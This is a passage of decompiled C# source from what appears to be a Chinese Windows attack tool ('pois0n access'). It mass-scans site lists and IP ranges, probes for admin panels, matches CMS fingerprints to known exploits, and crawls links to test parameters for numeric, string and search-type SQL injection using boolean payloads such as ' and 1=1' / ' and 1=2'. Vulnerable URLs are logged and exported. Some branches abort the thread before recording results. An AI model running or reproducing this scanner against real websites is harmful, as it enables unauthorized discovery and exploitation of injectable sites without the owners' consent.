												item21.SubItems.Add(my_scanUrl);
												item21.SubItems.Add(sArray[1].ToString());
												item21.SubItems.Add(exp20);
												string baohan20 = "0";
												for (int i28 = 0; i28 < this.listView3.Items.Count; i28++)
												{
													string aaa20 = this.listView3.Items[i28].SubItems[1].Text;
													if (aaa20 == WebRepScan.ResponseUri.ToString())
													{
														baohan20 = "1";
													}
												}
												if (baohan20 == "0" && !this.listView3.Items.Contains(item21))
												{
													this.DaochuGood(string.Concat(new string[]
													{
														my_scanUrl,
														"|",
														sArray[1].ToString(),
														"|",
														exp20
													}));
													this.listView3.Items.Add(item21);
													this.cmsjishu++;
													this.cmsSetTextMessage(this.cmsjishu * 100 / this.cmsjishuzongshu);
													GC.Collect();
													Thread.CurrentThread.Abort();
												}
												this.cmsjishu++;
												this.cmsSetTextMessage(this.cmsjishu * 100 / this.cmsjishuzongshu);
												return;
											}
											ListViewItem item22 = new ListViewItem();
											item22.Text = (this.listView3.Items.Count + 1).ToString();
											item22.SubItems.Add(my_scanUrl);
											item22.SubItems.Add(sArray[1].ToString());
											item22.SubItems.Add("网站未做安全隐患检测");
											string baohan21 = "0";
											for (int i29 = 0; i29 < this.listView3.Items.Count; i29++)
											{
												string aaa21 = this.listView3.Items[i29].SubItems[1].Text;
												if (aaa21 == WebRepScan.ResponseUri.ToString())
												{
													baohan21 = "1";
												}
											}
											if (baohan21 == "0" && !this.listView3.Items.Contains(item22))
											{
												this.listView3.Items.Add(item22);
											}
											this.cmsjishu++;
											this.cmsSetTextMessage(this.cmsjishu * 100 / this.cmsjishuzongshu);
											return;
										}
									}
									if (sArray[3].ToString() != "" && sss.IndexOf(sArray[3].ToString(), StringComparison.CurrentCultureIgnoreCase) > 0)
									{
										ListViewItem item23 = new ListViewItem();
										item23.Text = (this.listView3.Items.Count + 1).ToString();
										item23.SubItems.Add(my_scanUrl);
										item23.SubItems.Add(sArray[1].ToString());
										item23.SubItems.Add("网站未做安全隐患检测");
										string baohan22 = "0";
										for (int i30 = 0; i30 < this.listView3.Items.Count; i30++)
										{
											string aaa22 = this.listView3.Items[i30].SubItems[1].Text;
											if (aaa22 == WebRepScan.ResponseUri.ToString())
											{
												baohan22 = "1";
											}
										}
										if (baohan22 == "0" && !this.listView3.Items.Contains(item23))
										{
											this.listView3.Items.Add(item23);
										}
										this.cmsjishu++;
										this.cmsSetTextMessage(this.cmsjishu * 100 / this.cmsjishuzongshu);
									}
								}
							}
						}
					}
					catch
					{
					}
				}
				this.cmsjishu++;
				this.cmsSetTextMessage(this.cmsjishu * 100 / this.cmsjishuzongshu);
				srReader.Close();
			}
		}
		private void SetTextMessage(int ipos)
		{
			if (base.InvokeRequired)
			{
				FormMain.SetPos setpos = new FormMain.SetPos(this.SetTextMessage);
				base.Invoke(setpos, new object[]
				{
					ipos
				});
				return;
			}
			this.label16.Text = ipos.ToString() + "/100";
			this.progressBar1.Value = Convert.ToInt32(ipos);
		}
		private void SleepT()
		{
			for (int i = 0; i < 500; i++)
			{
				Thread.Sleep(10);
				this.SetTextMessage(100 * this.jindu / this.jindutiaozongshu);
			}
		}
		private void houtaiSetTextMessage(int ipos)
		{
			if (base.InvokeRequired)
			{
				FormMain.houtaiSetPos setpos = new FormMain.houtaiSetPos(this.houtaiSetTextMessage);
				base.Invoke(setpos, new object[]
				{
					ipos
				});
				return;
			}
			if (ipos > 100)
			{
				ipos = 100;
			}
			if (ipos == 100)
			{
				this.button12.Enabled = true;
				Settings.Default.HoutaiIsStop = "0";
				Settings.Default.Save();
			}
			this.label2.Text = ipos.ToString() + "/100";
			this.progressBar2.Value = Convert.ToInt32(ipos);
		}
		private void houtaiSetTextc(int ipos)
		{
			if (base.InvokeRequired)
			{
				FormMain.houtaiSetc setpos = new FormMain.houtaiSetc(this.houtaiSetTextc);
				base.Invoke(setpos, new object[]
				{
					ipos
				});
				return;
			}
			if (ipos > 100)
			{
				ipos = 100;
			}
			this.label30.Text = ipos.ToString() + "/100";
			this.progressBar4.Value = Convert.ToInt32(ipos);
		}
		private void cmsSetTextMessage(int ipos)
		{
			if (base.InvokeRequired)
			{
				FormMain.cmsSetPos setpos = new FormMain.cmsSetPos(this.cmsSetTextMessage);
				base.Invoke(setpos, new object[]
				{
					ipos
				});
				return;
			}
			if (ipos > 100)
			{
				ipos = 100;
			}
			if (ipos == 100)
			{
				this.button4.Enabled = true;
			}
			int arg_51_0 = ipos / this.cmsjishuzongshu;
			this.label18.Text = ipos.ToString() + "/100";
			this.progressBar3.Value = Convert.ToInt32(ipos);
		}
		private void cmsSleepT()
		{
			for (int i = 0; i < 500; i++)
			{
				Thread.Sleep(10);
				this.SetTextMessage(100 * this.houtaijishu / this.houtaijishuzongshu);
			}
		}
		private void houtaiSleepT()
		{
			for (int i = 0; i < 500; i++)
			{
				Thread.Sleep(10);
				this.SetTextMessage(100 * this.houtaijishu / this.houtaijishuzongshu);
			}
		}
		public static string GetMD5Hash(string input)
		{
			MD5 md5 = new MD5CryptoServiceProvider();
			byte[] res = md5.ComputeHash(Encoding.Default.GetBytes(input), 0, input.Length);
			char[] temp = new char[res.Length];
			Array.Copy(res, temp, res.Length);
			return new string(temp);
		}
		public static string GetMD5HashHex(string input)
		{
			MD5 md5 = new MD5CryptoServiceProvider();
			new DESCryptoServiceProvider();
			byte[] res = md5.ComputeHash(Encoding.Default.GetBytes(input), 0, input.Length);
			string returnThis = "";
			for (int i = 0; i < res.Length; i++)
			{
				returnThis += Uri.HexEscape((char)res[i]);
			}
			returnThis = returnThis.Replace("%", "");
			return returnThis.ToLower();
		}
		public void Scancduan()
		{
			for (int i = 0; i < this.listBox3.Items.Count; i++)
			{
				string urls = this.listBox3.Items[i].ToString();
				ThreadPool.SetMaxThreads(250, 250);
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Scan_youhua), urls);
			}
		}
		private void EndScanc(IAsyncResult arResult)
		{
			GC.Collect();
		}
		public string Converttobase64(string txt)
		{
			if (txt != "")
			{
				byte[] bn = Encoding.Default.GetBytes(txt);
				return Convert.ToBase64String(bn);
			}
			return "";
		}
		private void button2_Click(object sender, EventArgs e)
		{
			this.listView1.Items.Clear();
			this.jindu = 0;
			this.SetTextMessage(this.jindu / this.jindutiaozongshu);
			FormMain.DelegateToGetwebsite delStartGetTable = new FormMain.DelegateToGetwebsite(this.getwebsite);
			AsyncCallback callBackWhenDone = new AsyncCallback(this.EndGetwebsite);
			delStartGetTable.BeginInvoke(callBackWhenDone, null);
		}
		private void treeViewToolTree_NodeMouseDoubleClick(object sender, TreeNodeMouseClickEventArgs e)
		{
			Point pt = new Point(e.X, e.Y);
			string name = this.treeViewToolTree.GetNodeAt(pt).Name;
			this.SelectTool(name);
		}
		private void ButtonSetting_Click(object sender, EventArgs e)
		{
			this.SelectTool("Setting");
		}
		private void button10_Click(object sender, EventArgs e)
		{
			try
			{
				string url = this.textBox7.Text;
				if (url == "")
				{
					MessageBox.Show("请输入域名！");
				}
				else
				{
					MatchCollection matchs = new Regex("^((2[0-4]\\d|25[0-5]|[01]?\\d\\d?)\\.){3}(2[0-4]\\d|25[0-5]|[01]?\\d\\d?)$", RegexOptions.None).Matches(url);
					IEnumerator enumerator = matchs.GetEnumerator();
					try
					{
						if (enumerator.MoveNext())
						{
							Match arg_51_0 = (Match)enumerator.Current;
							this.textBox10.Text = url;
							return;
						}
					}
					finally
					{
						IDisposable disposable = enumerator as IDisposable;
						if (disposable != null)
						{
							disposable.Dispose();
						}
					}
					IPHostEntry dnstoip = new IPHostEntry();
					dnstoip = Dns.Resolve(url);
					for (int i = 0; i < dnstoip.AddressList.Length; i++)
					{
						this.textBox10.Text = dnstoip.AddressList[i].ToString();
					}
					string text = this.textBox10.Text;
					MatchCollection matchs2 = new Regex("^((2[0-4]\\d|25[0-5]|[01]?\\d\\d?)\\.){3}(2[0-4]\\d|25[0-5]|[01]?\\d\\d?)$", RegexOptions.None).Matches(text);
					IEnumerator enumerator2 = matchs2.GetEnumerator();
					try
					{
						if (enumerator2.MoveNext())
						{
							Match match = (Match)enumerator2.Current;
							string ip = this.textBox10.Text;
							string urls = match.Groups[3].ToString();
							string aa = ip.Replace(urls, "1");
							string bb = ip.Replace(urls, "255");
							this.textBox8.Text = aa;
							this.textBox9.Text = bb;
						}
					}
					finally
					{
						IDisposable disposable2 = enumerator2 as IDisposable;
						if (disposable2 != null)
						{
							disposable2.Dispose();
						}
					}
				}
			}
			catch
			{
			}
		}
		private void button15_Click(object sender, EventArgs e)
		{
			try
			{
				ListViewItem item = new ListViewItem();
				item.Text = (this.listView1.Items.Count + 1).ToString();
				item.SubItems.Add(this.textBox4.Text.Trim());
				item.SubItems.Add("");
				item.SubItems.Add("");
				this.listView1.Items.Add(item);
			}
			catch
			{
			}
		}
		private void button16_Click(object sender, EventArgs e)
		{
			try
			{
				int ss = this.listView1.SelectedItems[0].Index;
				this.listView1.Items[ss].Remove();
				MessageBox.Show("删除成功");
				this.label5.Text = this.listView1.Items.Count.ToString();
			}
			catch
			{
			}
		}
		private void button3_Click(object sender, EventArgs e)
		{
			this.progressBar4.Value = 0;
			this.cduanjishu = 0;
			this.listBox2.Items.Clear();
			FormMain.DelegateToScanc delStartGetTable = new FormMain.DelegateToScanc(this.scan);
			AsyncCallback callBackWhenDone = new AsyncCallback(this.EndScanc);
			delStartGetTable.BeginInvoke(callBackWhenDone, null);
		}
		private void button9_Click(object sender, EventArgs e)
		{
			try
			{
				this.button12.Enabled = true;
				Settings.Default.CduanIsStop = "1";
				Settings.Default.Save();
			}
			catch
			{
				MessageBox.Show("停止失败");
			}
		}
		private void button20_Click(object sender, EventArgs e)
		{
			try
			{
				SaveFileDialog sfd = new SaveFileDialog();
				sfd.Filter = "日志文件（*.txt）|*.txt";
				sfd.FilterIndex = 1;
				sfd.RestoreDirectory = true;
				if (sfd.ShowDialog() == DialogResult.OK)
				{
					string localFilePath = sfd.FileName.ToString();
					if (!File.Exists(localFilePath))
					{
						FileStream fs = new FileStream(localFilePath, FileMode.Create, FileAccess.Write);
						fs.Close();
						StreamWriter sw = new StreamWriter(localFilePath, true);
						for (int cv = 0; cv < this.listBox2.Items.Count; cv++)
						{
							string[] cli = this.listBox2.Items[cv].ToString().Split(new char[]
							{
								' '
							});
							sw.WriteLine(cli[0].ToString());
						}
						sw.Close();
					}
					else
					{
						StreamWriter sw2 = new StreamWriter(localFilePath, true);
						for (int cv2 = 0; cv2 < this.listBox2.Items.Count; cv2++)
						{
							string[] cli2 = this.listBox2.Items[cv2].ToString().Split(new char[]
							{
								' '
							});
							sw2.WriteLine(cli2[0].ToString());
						}
						sw2.Close();
					}
					MessageBox.Show("导出完毕!");
				}
			}
			catch
			{
			}
		}
		private void button11_Click(object sender, EventArgs e)
		{
			try
			{
				this.listBox3.Items.Clear();
				for (int i = 0; i < this.listView1.Items.Count; i++)
				{
					this.listBox3.Items.Add(this.listView1.Items[i].SubItems[1].Text);
				}
				this.label13.Text = "网站数量：" + this.listView1.Items.Count;
			}
			catch
			{
				MessageBox.Show("导入失败");
			}
		}
		private void button24_Click(object sender, EventArgs e)
		{
			this.listBox3.Items.Clear();
			for (int i = 0; i < this.listBox2.Items.Count; i++)
			{
				string[] cli = this.listBox2.Items[i].ToString().Split(new char[]
				{
					' '
				});
				if (!this.listBox3.Items.Contains(cli[0].ToString()))
				{
					this.listBox3.Items.Add(cli[0].ToString());
				}
			}
			this.label13.Text = "网站数量：" + this.listBox3.Items.Count;
		}
		private void button12_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listBox3.Items.Count == 0)
				{
					MessageBox.Show("没网站，你扫描个屁呀！");
				}
				else
				{
					Settings.Default.HoutaiIsStop = "0";
					Settings.Default.Save();
					this.button12.Enabled = false;
					this.progressBar2.Value = 0;
					this.houtaijishu = 0;
					this.progressBar2.Value = 0;
					this.label2.Text = "0/100";
					this.houtaijishuzongshu = this.listBox3.Items.Count;
					this.listView2.Items.Clear();
					FormMain.DelegateToScanAdmin delStartGetTable = new FormMain.DelegateToScanAdmin(this.scan_admin);
					AsyncCallback callBackWhenDone = new AsyncCallback(this.EndScanAdmin);
					delStartGetTable.BeginInvoke(callBackWhenDone, null);
				}
			}
			catch
			{
				MessageBox.Show("失败！");
			}
		}
		private void button22_Click(object sender, EventArgs e)
		{
			try
			{
				this.button12.Enabled = true;
				Settings.Default.HoutaiIsStop = "1";
				Settings.Default.Save();
			}
			catch
			{
				MessageBox.Show("停止失败");
			}
		}
		private void button1_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.InitialDirectory = "c:\\";
			openFileDialog.Filter = "txt files (*.txt)|*.txt|All files (*.*)|*.*";
			openFileDialog.FilterIndex = 2;
			openFileDialog.RestoreDirectory = true;
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				this.listBox3.Items.Clear();
				if (openFileDialog.OpenFile() != null)
				{
					string vvc = openFileDialog.FileName;
					StreamReader srReader = new StreamReader(vvc);
					string admin_path;
					while ((admin_path = srReader.ReadLine()) != null)
					{
						string bbv = admin_path;
						bbv = bbv.Replace("http://", "");
						bbv = bbv.Replace("https://", "");
						this.listBox3.Items.Add(bbv);
					}
					srReader.Close();
				}
			}
		}
		private void button14_Click(object sender, EventArgs e)
		{
			SaveFileDialog sfd = new SaveFileDialog();
			sfd.Filter = "日志文件（*.txt）|*.txt";
			sfd.FilterIndex = 1;
			sfd.RestoreDirectory = true;
			if (sfd.ShowDialog() == DialogResult.OK)
			{
				string localFilePath = sfd.FileName.ToString();
				if (!File.Exists(localFilePath))
				{
					FileStream fs = new FileStream(localFilePath, FileMode.Create, FileAccess.Write);
					fs.Close();
					StreamWriter sw = new StreamWriter(localFilePath, true);
					for (int cv = 0; cv < this.listView2.Items.Count; cv++)
					{
						sw.WriteLine(this.listView2.Items[cv].SubItems[1].Text);
					}
					sw.Close();
				}
				else
				{
					StreamWriter sw2 = new StreamWriter(localFilePath, true);
					for (int cv2 = 0; cv2 < this.listView2.Items.Count; cv2++)
					{
						sw2.WriteLine(this.listView2.Items[cv2].SubItems[1].Text);
					}
					sw2.Close();
				}
				MessageBox.Show("导出完毕!");
			}
		}
		private void button6_Click(object sender, EventArgs e)
		{
			try
			{
				this.listBox7.Items.Clear();
				for (int i = 0; i < this.listView1.Items.Count; i++)
				{
					this.listBox7.Items.Add(this.listView1.Items[i].SubItems[1].Text);
				}
			}
			catch
			{
				MessageBox.Show("导入失败");
			}
		}
		private void button25_Click(object sender, EventArgs e)
		{
			try
			{
				this.listBox7.Items.Clear();
				for (int i = 0; i < this.listBox2.Items.Count; i++)
				{
					string[] cli = this.listBox2.Items[i].ToString().Split(new char[]
					{
						' '
					});
					if (!this.listBox7.Items.Contains(cli[0].ToString()))
					{
						this.listBox7.Items.Add(cli[0].ToString());
					}
				}
			}
			catch
			{
			}
		}
		private void button5_Click(object sender, EventArgs e)
		{
			try
			{
				OpenFileDialog openFileDialog = new OpenFileDialog();
				openFileDialog.InitialDirectory = "c:\\";
				openFileDialog.Filter = "txt files (*.txt)|*.txt";
				openFileDialog.FilterIndex = 2;
				openFileDialog.RestoreDirectory = true;
				if (openFileDialog.ShowDialog() == DialogResult.OK && openFileDialog.OpenFile() != null)
				{
					this.listBox7.Items.Clear();
					string vvc = openFileDialog.FileName;
					StreamReader srReader = new StreamReader(vvc);
					string admin_path;
					while ((admin_path = srReader.ReadLine()) != null)
					{
						string bbv = admin_path;
						bbv = bbv.Replace("http://", "");
						bbv = bbv.Replace("https://", "");
						if (!this.listBox7.Items.Contains(bbv))
						{
							this.listBox7.Items.Add(bbv);
						}
					}
					srReader.Close();
				}
			}
			catch
			{
				MessageBox.Show("导入失败");
			}
		}
		public void DaochuGood(string url)
		{
			try
			{
				if (!File.Exists(this.localFilePath))
				{
					FileStream fs = new FileStream(this.localFilePath, FileMode.Create, FileAccess.Write);
					fs.Close();
					StreamWriter sw = new StreamWriter(this.localFilePath, true);
					sw.WriteLine(url);
					sw.Close();
				}
				else
				{
					StreamWriter sw2 = new StreamWriter(this.localFilePath, true);
					sw2.WriteLine(url);
					sw2.Close();
				}
			}
			catch
			{
			}
		}
		private void button4_Click(object sender, EventArgs e)
		{
			if (this.listBox7.Items.Count == 0)
			{
				MessageBox.Show("没网站，你识别个毛呀！");
				return;
			}
			this.button4.Enabled = false;
			Settings.Default.CmsIsStop = "0";
			Settings.Default.Save();
			this.cmsjishu = 0;
			this.label18.Text = "0/100";
			this.progressBar3.Value = 0;
			this.cmsjishuzongshu = this.listBox7.Items.Count;
			this.listView3.Items.Clear();
			FormMain.DelegateToScancms delStartGetTable = new FormMain.DelegateToScancms(this.scan_cms);
			AsyncCallback callBackWhenDone = new AsyncCallback(this.EndScancms);
			delStartGetTable.BeginInvoke(callBackWhenDone, null);
		}
		private void button21_Click(object sender, EventArgs e)
		{
			try
			{
				this.button4.Enabled = true;
				Settings.Default.CmsIsStop = "1";
				Settings.Default.Save();
			}
			catch
			{
				MessageBox.Show("操作失败");
			}
		}
		private void button7_Click(object sender, EventArgs e)
		{
			SaveFileDialog sfd = new SaveFileDialog();
			sfd.Filter = "日志文件（*.txt）|*.txt";
			sfd.FilterIndex = 1;
			sfd.RestoreDirectory = true;
			if (sfd.ShowDialog() == DialogResult.OK)
			{
				string localFilePath = sfd.FileName.ToString();
				if (!File.Exists(localFilePath))
				{
					FileStream fs = new FileStream(localFilePath, FileMode.Create, FileAccess.Write);
					fs.Close();
					StreamWriter sw = new StreamWriter(localFilePath, true);
					for (int cv = 0; cv < this.listView3.Items.Count; cv++)
					{
						sw.WriteLine(string.Concat(new string[]
						{
							this.listView3.Items[cv].SubItems[0].Text,
							" ",
							this.listView3.Items[cv].SubItems[1].Text,
							" ",
							this.listView3.Items[cv].SubItems[2].Text,
							" ",
							this.listView3.Items[cv].SubItems[3].Text
						}));
					}
					sw.Close();
				}
				else
				{
					StreamWriter sw2 = new StreamWriter(localFilePath, true);
					for (int cv2 = 0; cv2 < this.listView3.Items.Count; cv2++)
					{
						sw2.WriteLine(string.Concat(new string[]
						{
							this.listView3.Items[cv2].SubItems[0].Text,
							" ",
							this.listView3.Items[cv2].SubItems[1].Text,
							" ",
							this.listView3.Items[cv2].SubItems[2].Text,
							" ",
							this.listView3.Items[cv2].SubItems[3].Text
						}));
					}
					sw2.Close();
				}
				MessageBox.Show("导出完毕!");
			}
		}
		private void button23_Click(object sender, EventArgs e)
		{
			try
			{
				string text = this.label24.Text;
				if (text == "程序没有配置")
				{
					this.label24.Text = "程序已经配置";
					Settings.Default.HoutaiScan = "1";
					Settings.Default.Save();
				}
				else
				{
					this.label24.Text = "程序没有配置";
					Settings.Default.HoutaiScan = "0";
					Settings.Default.Save();
				}
			}
			catch
			{
			}
		}
		private void 打开ToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				string aa = this.listView1.SelectedItems[0].SubItems[1].Text;
				if (!string.IsNullOrEmpty(aa))
				{
					Process.Start("http://" + aa);
				}
			}
			catch
			{
			}
		}
		private void 复制ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView1.Items.Count > 0)
			{
				string bb = this.listView1.SelectedItems[0].SubItems[1].Text;
				if (this.listView1.SelectedItems.Count > 0 && !string.IsNullOrEmpty(bb) && this.listView1.SelectedItems[0].Text != "")
				{
					Clipboard.SetDataObject(bb);
				}
			}
		}
		private void 复制ToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			if (this.listBox2.Items.Count > 0)
			{
				string bb = this.listBox2.SelectedItem.ToString();
				if (this.listBox2.SelectedItems.Count > 0 && !string.IsNullOrEmpty(bb) && this.listBox2.SelectedItem.ToString() != "")
				{
					Clipboard.SetDataObject(bb);
				}
			}
		}
		private void 导出ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				SaveFileDialog sfd = new SaveFileDialog();
				sfd.Filter = "日志文件（*.txt）|*.txt";
				sfd.FilterIndex = 1;
				sfd.RestoreDirectory = true;
				if (sfd.ShowDialog() == DialogResult.OK)
				{
					string localFilePath = sfd.FileName.ToString();
					if (!File.Exists(localFilePath))
					{
						FileStream fs = new FileStream(localFilePath, FileMode.Create, FileAccess.Write);
						fs.Close();
						StreamWriter sw = new StreamWriter(localFilePath, true);
						for (int cv = 0; cv < this.listBox2.Items.Count; cv++)
						{
							string[] cli = this.listBox2.Items[cv].ToString().Split(new char[]
							{
								' '
							});
							sw.WriteLine(cli[0].ToString());
						}
						sw.Close();
					}
					else
					{
						StreamWriter sw2 = new StreamWriter(localFilePath, true);
						for (int cv2 = 0; cv2 < this.listBox2.Items.Count; cv2++)
						{
							string[] cli2 = this.listBox2.Items[cv2].ToString().Split(new char[]
							{
								' '
							});
							sw2.WriteLine(cli2[0].ToString());
						}
						sw2.Close();
					}
					MessageBox.Show("导出完毕!");
				}
			}
			catch
			{
			}
		}
		private void 打开网址ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				string aa = this.listView2.SelectedItems[0].SubItems[1].Text;
				if (!string.IsNullOrEmpty(aa))
				{
					Process.Start(aa);
				}
			}
			catch
			{
			}
		}
		private void toolStripMenuItem1_Click(object sender, EventArgs e)
		{
			if (this.listView2.Items.Count > 0)
			{
				string bb = this.listView2.SelectedItems[0].SubItems[1].Text;
				if (this.listView2.SelectedItems.Count > 0 && !string.IsNullOrEmpty(bb) && this.listView2.SelectedItems[0].Text != "")
				{
					Clipboard.SetDataObject(bb);
				}
			}
		}
		private void 导出ToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			SaveFileDialog sfd = new SaveFileDialog();
			sfd.Filter = "日志文件（*.txt）|*.txt";
			sfd.FilterIndex = 1;
			sfd.RestoreDirectory = true;
			if (sfd.ShowDialog() == DialogResult.OK)
			{
				string localFilePath = sfd.FileName.ToString();
				if (!File.Exists(localFilePath))
				{
					FileStream fs = new FileStream(localFilePath, FileMode.Create, FileAccess.Write);
					fs.Close();
					StreamWriter sw = new StreamWriter(localFilePath, true);
					for (int cv = 0; cv < this.listView2.Items.Count; cv++)
					{
						sw.WriteLine(this.listView2.Items[cv].SubItems[1].Text);
					}
					sw.Close();
				}
				else
				{
					StreamWriter sw2 = new StreamWriter(localFilePath, true);
					for (int cv2 = 0; cv2 < this.listView2.Items.Count; cv2++)
					{
						sw2.WriteLine(this.listView2.Items[cv2].SubItems[1].Text);
					}
					sw2.Close();
				}
				MessageBox.Show("导出完毕!");
			}
		}
		private void 打开ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				string aa = this.listView3.SelectedItems[0].SubItems[1].Text;
				if (!string.IsNullOrEmpty(aa))
				{
					Process.Start(aa);
				}
			}
			catch
			{
			}
		}
		private void toolStripMenuItem2_Click(object sender, EventArgs e)
		{
			if (this.listView3.Items.Count > 0)
			{
				string bb = string.Concat(new string[]
				{
					this.listView3.SelectedItems[0].SubItems[1].Text,
					"|",
					this.listView3.SelectedItems[0].SubItems[2].Text,
					"|",
					this.listView3.SelectedItems[0].SubItems[3].Text
				});
				if (this.listView3.SelectedItems.Count > 0 && !string.IsNullOrEmpty(bb) && this.listView3.SelectedItems[0].Text != "")
				{
					Clipboard.SetDataObject(bb);
				}
			}
		}
		private void 导出ToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			SaveFileDialog sfd = new SaveFileDialog();
			sfd.Filter = "日志文件（*.txt）|*.txt";
			sfd.FilterIndex = 1;
			sfd.RestoreDirectory = true;
			if (sfd.ShowDialog() == DialogResult.OK)
			{
				string localFilePath = sfd.FileName.ToString();
				if (!File.Exists(localFilePath))
				{
					FileStream fs = new FileStream(localFilePath, FileMode.Create, FileAccess.Write);
					fs.Close();
					StreamWriter sw = new StreamWriter(localFilePath, true);
					for (int cv = 0; cv < this.listView3.Items.Count; cv++)
					{
						sw.WriteLine(string.Concat(new string[]
						{
							this.listView3.Items[cv].SubItems[0].Text,
							" ",
							this.listView3.Items[cv].SubItems[1].Text,
							" ",
							this.listView3.Items[cv].SubItems[2].Text,
							" ",
							this.listView3.Items[cv].SubItems[3].Text
						}));
					}
					sw.Close();
				}
				else
				{
					StreamWriter sw2 = new StreamWriter(localFilePath, true);
					for (int cv2 = 0; cv2 < this.listView3.Items.Count; cv2++)
					{
						sw2.WriteLine(string.Concat(new string[]
						{
							this.listView3.Items[cv2].SubItems[0].Text,
							" ",
							this.listView3.Items[cv2].SubItems[1].Text,
							" ",
							this.listView3.Items[cv2].SubItems[2].Text,
							" ",
							this.listView3.Items[cv2].SubItems[3].Text
						}));
					}
					sw2.Close();
				}
				MessageBox.Show("导出完毕!");
			}
		}
		private void toolStripButton1_Click(object sender, EventArgs e)
		{
			this.WebBrowserGo();
		}
		private void toolStripButton2_Click(object sender, EventArgs e)
		{
			if (WebSite.CurrentStatus == TaskStatus.Ready)
			{
				WebSite.CurrentStatus = TaskStatus.Pause;
				this.DisplayProgress("PAUSE");
				return;
			}
			if (WebSite.CurrentStatus == TaskStatus.Pause)
			{
				WebSite.CurrentStatus = TaskStatus.Ready;
			}
		}
		private void toolStripButton4_Click(object sender, EventArgs e)
		{
			WebSite.CurrentStatus = TaskStatus.Stop;
			this.DisplayProgress("Terminating Threads... ");
			WebSite.StopTime = DateTime.Now;
		}
		public void zhurudianxiancheng(object urls)
		{
			string url = urls.ToString();
			url = "http://" + url + "/";
			string strWebContent = this.GetWebContent(url);
			this.DumpHrefs(strWebContent, url);
		}
		private void DumpHrefs(string inputString, string url)
		{
			try
			{
				Regex r = new Regex("href\\s*=\\s*(?:\"(?<1>[^\"]*)\"|(?<1>\\S+))", RegexOptions.IgnoreCase | RegexOptions.Compiled);
				Match i = r.Match(inputString);
				while (i.Success)
				{
					string bbv = i.Groups[1].ToString().Replace("'", "").Replace("#", "");
					if (!bbv.Contains("http://"))
					{
						bbv = url + bbv;
					}
					if (bbv.Contains("?") && bbv.Contains("=") && !bbv.Contains(">") && !bbv.Contains(" ") && bbv.Substring(0, url.Length) == url && !this.listBox5.Items.Contains(bbv))
					{
						this.listBox5.Items.Add(bbv);
						this.jiancezhurudian(bbv);
					}
					i = i.NextMatch();
				}
			}
			catch
			{
			}
		}
		private void getHttpStatuscodeAndContentLength(string m_HttpUrl, out HttpStatusCode m_StatusCode, out long m_ContentLength)
		{
			m_StatusCode = HttpStatusCode.BadRequest;
			m_ContentLength = 0L;
			try
			{
				HttpWebRequest pois0nWebReq = (HttpWebRequest)WebRequest.Create(new Uri(m_HttpUrl));
				pois0nWebReq.UserAgent = "User-Agent\tMozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) pois0n access/beta v1.0";
				HttpWebResponse pois0nWebRep = (HttpWebResponse)pois0nWebReq.GetResponse();
				m_StatusCode = pois0nWebRep.StatusCode;
				m_ContentLength = pois0nWebRep.ContentLength;
				pois0nWebReq.Abort();
				pois0nWebRep.Close();
			}
			catch
			{
			}
		}
		public void jiancezhurudian(string url)
		{
			this.getHttpStatuscodeAndContentLength(url, out this.normalStatusCode, out this.normalContentLength);
			this.getHttpStatuscodeAndContentLength(url + " and 1=1", out this.StatusCode_11, out this.ContentLength_11);
			this.getHttpStatuscodeAndContentLength(url + " and 1=2", out this.StatusCode_12, out this.ContentLength_12);
			if (this.checkSqlInjection(this.normalStatusCode, this.StatusCode_11, this.StatusCode_12, this.normalContentLength, this.ContentLength_11, this.ContentLength_12))
			{
				this.listBox6.Items.Add(url + "   存在数字型注入点");
				Thread.CurrentThread.Abort();
				return;
			}
			this.getHttpStatuscodeAndContentLength(url + "' and '1'='1", out this.StatusCode_11, out this.ContentLength_11);
			this.getHttpStatuscodeAndContentLength(url + "' and '1'='2", out this.StatusCode_12, out this.ContentLength_12);
			if (this.checkSqlInjection(this.normalStatusCode, this.StatusCode_11, this.StatusCode_12, this.normalContentLength, this.ContentLength_11, this.ContentLength_12))
			{
				Thread.CurrentThread.Abort();
				this.listBox6.Items.Add(url + "   存在字符型注入点");
				return;
			}
			this.getHttpStatuscodeAndContentLength(url + "%25' and 1=1 and '%25'='", out this.StatusCode_11, out this.ContentLength_11);
			this.getHttpStatuscodeAndContentLength(url + "%25' and 1=2 and '%25'='", out this.StatusCode_12, out this.ContentLength_12);
			if (this.checkSqlInjection(this.normalStatusCode, this.StatusCode_11, this.StatusCode_12, this.normalContentLength, this.ContentLength_11, this.ContentLength_12))
			{
				Thread.CurrentThread.Abort();
				this.listBox6.Items.Add(url + "   存在搜索型注入点");
			}
		}
		private bool checkSqlInjection(HttpStatusCode normalStatusCode, HttpStatusCode StatusCode11, HttpStatusCode StatusCode12, long normalContentLength, long ContentLength11, long ContentLength12)
		{
			if (StatusCode11 == normalStatusCode && StatusCode11 != StatusCode12)
			{
				return true;
			}
			if (normalContentLength != 0L && ContentLength11 != 0L && ContentLength12 != 0L)
			{
				return normalContentLength == ContentLength11 && ContentLength11 != ContentLength12;
			}
			return normalContentLength != 0L && ContentLength11 != 0L && ContentLength12 == 0L;
		}
		private string GetWebContent(string Url)
		{
			string strResult = "";
			try
			{
				HttpWebRequest request = (HttpWebRequest)WebRequest.Create(Url);
				request.Timeout = 30000;
				request.Headers.Set("Pragma", "no-cache");
				HttpWebResponse response = (HttpWebResponse)request.GetResponse();
				Stream streamReceive = response.GetResponseStream();
				Encoding encoding = Encoding.GetEncoding("GB2312");
				StreamReader streamReader = new StreamReader(streamReceive, encoding);
				strResult = streamReader.ReadToEnd();
			}
			catch
			{
				strResult = "";
			}
			return strResult;
		}
		public void zhurudian()
		{
			for (int i = 0; i < this.listBox4.Items.Count; i++)
			{
				string url = this.listBox4.Items[i].ToString();
				ThreadPool.SetMaxThreads(50, 50);
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.zhurudianxiancheng), url);
			}
		}
